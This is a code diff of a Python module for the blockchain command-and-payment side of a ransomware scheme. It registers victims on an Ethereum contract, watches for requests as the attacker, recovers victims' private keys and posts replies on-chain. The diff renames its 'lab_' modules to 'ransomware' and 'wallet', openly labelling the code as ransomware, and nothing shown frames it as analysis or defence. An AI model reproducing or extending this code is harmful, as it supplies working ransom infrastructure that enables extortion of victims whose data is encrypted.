@@ -32,8 +32,8 @@ from eth_account import Account
 from eth_abi import decode as abi_decode, encode as abi_encode
 from eth_utils import keccak
 
-import lab_keylogic
-import lab_wallet
+import ransomware
+import wallet
 
 
 SELECTOR_REGISTER = keccak(text="registerVictim(bytes)")[:4]
@@ -82,7 +82,7 @@ def discover_contract(config: dict) -> str:
             address = entry
     if not address:
         raise RuntimeError("utility server returned no contract address")
-    return lab_wallet.validate_address(address)
+    return wallet.validate_address(address)
 
 
 def load_wallet_key(keystore_path: Path, password: str) -> Account:
@@ -104,9 +104,9 @@ def load_chain_key(account_file: Path) -> Account:
 def send_tx(config: dict, account: Account, to: str, value: int, data: bytes, gas: int):
     """Build, sign, and submit one real transaction; return its hash."""
     nonce = int(
-        lab_wallet.rpc(config, "eth_getTransactionCount", [account.address, "pending"]), 16
+        wallet.rpc(config, "eth_getTransactionCount", [account.address, "pending"]), 16
     )
-    gas_price = int(lab_wallet.rpc(config, "eth_gasPrice", []), 16)
+    gas_price = int(wallet.rpc(config, "eth_gasPrice", []), 16)
     tx = {
         "to": to,
         "value": value,
@@ -118,14 +118,14 @@ def send_tx(config: dict, account: Account, to: str, value: int, data: bytes, ga
     }
     signed = account.sign_transaction(tx)
     raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
-    return lab_wallet.rpc(config, "eth_sendRawTransaction", ["0x" + raw.hex()])
+    return wallet.rpc(config, "eth_sendRawTransaction", ["0x" + raw.hex()])
 
 
 def wait_receipt(config: dict, tx_hash: str, timeout: int = RECEIPT_TIMEOUT) -> dict:
     """Poll for the transaction receipt; no result before it is mined."""
     deadline = time.monotonic() + timeout
     while time.monotonic() < deadline:
-        receipt = lab_wallet.rpc(config, "eth_getTransactionReceipt", [tx_hash])
+        receipt = wallet.rpc(config, "eth_getTransactionReceipt", [tx_hash])
         if receipt is not None:
             if int(receipt["status"], 16) != 1:
                 raise RuntimeError(f"transaction reverted on-chain: {tx_hash}")
@@ -144,7 +144,7 @@ def call_single(config: dict, to: str, selector: bytes, arg: int, out_types: lis
     """
     data = "0x" + (selector + abi_encode(["uint256"], [arg])).hex()
     try:
-        result = lab_wallet.rpc(config, "eth_call", [{"to": to, "data": data}, "latest"])
+        result = wallet.rpc(config, "eth_call", [{"to": to, "data": data}, "latest"])
     except RuntimeError as error:
         if "execution reverted" in str(error):
             return None
@@ -173,7 +173,7 @@ def register_request(
     # Never attach value to a target without code: a failed deployment
     # leaves a dead address in the address book, and a payment to it would
     # be a silent, unrecoverable donation.
-    code = lab_wallet.rpc(config, "eth_getCode", [address, "latest"])
+    code = wallet.rpc(config, "eth_getCode", [address, "latest"])
     if len(code) <= 2:
         raise RuntimeError(
             f"no contract code at {address}; the deployment failed. "
@@ -213,7 +213,7 @@ def extract_request_id(receipt: dict) -> int:
 def wait_reply(config: dict, request_id: int, deadline_seconds: int = 600) -> dict:
     """Poll getReply on-chain until the attacker's reply appears.
 
-    Returns the reply record ready for lab_keylogic.victim_accept_reply.
+    Returns the reply record ready for ransomware.victim_accept_reply.
     """
     address = discover_contract(config)
     deadline = time.monotonic() + deadline_seconds
@@ -314,7 +314,7 @@ def attacker_watch(
     # attacker. Verify locally first: a stale key otherwise burns gas on a
     # guaranteed revert.
     data = "0x" + keccak(text="attacker()")[:4].hex()
-    raw = lab_wallet.rpc(config, "eth_call", [{"to": address, "data": data}, "latest"])
+    raw = wallet.rpc(config, "eth_call", [{"to": address, "data": data}, "latest"])
     onchain_attacker = abi_decode(["address"], bytes.fromhex(raw[2:]))[0]
     if onchain_attacker.lower() != chain_account.address.lower():
         raise RuntimeError(
@@ -334,11 +334,11 @@ def attacker_watch(
             "victim_priv_sealed": json.loads(entry["sealed_blob_json"]),
         }
         # Offline crypto with attacker_priv: recover victim_priv.
-        victim_priv_pem = lab_keylogic.attacker_open_victim_priv(
+        victim_priv_pem = ransomware.attacker_open_victim_priv(
             unb64(attacker_keys["attacker_priv_pem"]), keylog_view
         )
         # Plaintext reply: no transport sealing, no ephemeral keys.
-        reply = lab_keylogic.attacker_build_reply(victim_priv_pem)
+        reply = ransomware.attacker_build_reply(victim_priv_pem)
         plain_reply = json.dumps(reply).encode("utf-8")
         data = (
             SELECTOR_SUBMIT_REPLY
